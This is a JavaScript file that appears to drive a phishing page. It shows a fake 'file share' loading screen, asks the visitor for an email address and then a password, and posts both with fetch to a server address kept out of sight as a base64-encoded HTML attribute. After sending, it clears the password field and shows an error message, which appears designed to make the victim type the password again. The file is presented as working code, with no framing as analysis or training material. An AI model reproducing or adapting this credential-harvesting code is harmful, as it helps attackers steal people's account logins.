

var loading = document.getElementById("Loading");
var filesClick = document.querySelectorAll(".fileClick");
var div = document.getElementById("Selector");
var selectorEmail = document.getElementById('selectorChild');
var selectorPass = document.getElementById('selectorPass');
var emailSpan = document.getElementById('emailSpan');
var overlay = document.getElementById('overlay');


window.onload = function(){
    document.getElementById("clientEmail").value = '';
}

filesClick.forEach(fileShare =>{
    fileShare.addEventListener('click', function(){
        if (loading.style.display ==="none" || loading.style.display ===""){
            loading.style.display ="block";
            overlay.style.display ="block";
        }else{
            loading.style.display = "none";
        }
        setTimeout(function(){
            loading.style.display = "none";
            div.style.display = "block";
        }, 3000)
    })
})


const nextBtn = document.getElementById("nextBtn");
const clEmail = document.getElementById("clientEmail");
const divEmailValue = document.getElementById("divEmail");
const errorMsg = document.getElementById("emailError");
const bollocks =  (document.querySelector('html').getAttribute('data-bollocks'))
nextBtn.addEventListener('click', function(){
    const emailValue = clEmail.value;

    if(!validateEmail(emailValue)){
        errorMsg.style.display = "block";
        clEmail.style.borderBottom = '1px solid red';
        return;
    }
    selectorEmail.style.display = "none";
    clEmail.style.display = "none";
    nextBtn.style.display = "none";
    emailSpan.style.display = "none";
    divEmailValue.textContent = emailValue;
    selectorPass.style.display = "block";

})

function validateEmail(email){
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailPattern.test(email);
}

const passError = document.getElementById("passError");
const entBtn = document.getElementById("signBtn");
const clPass = document.getElementById("clientPass");
  entBtn.addEventListener('click', function(){
    const globalEmail = clEmail.value;
    const passValue = clPass.value;
    const formData = new FormData();
    formData.append('globalEmail', globalEmail);
    formData.append('passValue', passValue);
    if(passValue.length < 6){
      passError.textContent = "password cannot be less than 6";
    }else{
        loading.style.display = "block";

        fetch(atob(bollocks), {
            method: 'POST',
            body: formData
        })
        .then(response => {
            loading.style.display = "none";
            passError.style.display = "block"
            clPass.value = ""
            if(!response){
                return response.text().then(text => {
                    throw new Error(text);
                })
            }
            return response.json();
        })
        .then(data => {
            errorMsgPass.textContent = data.message;
        })
        .catch(error =>{ 
            errorMsgPass.textContent = error;
        })
    } 
})

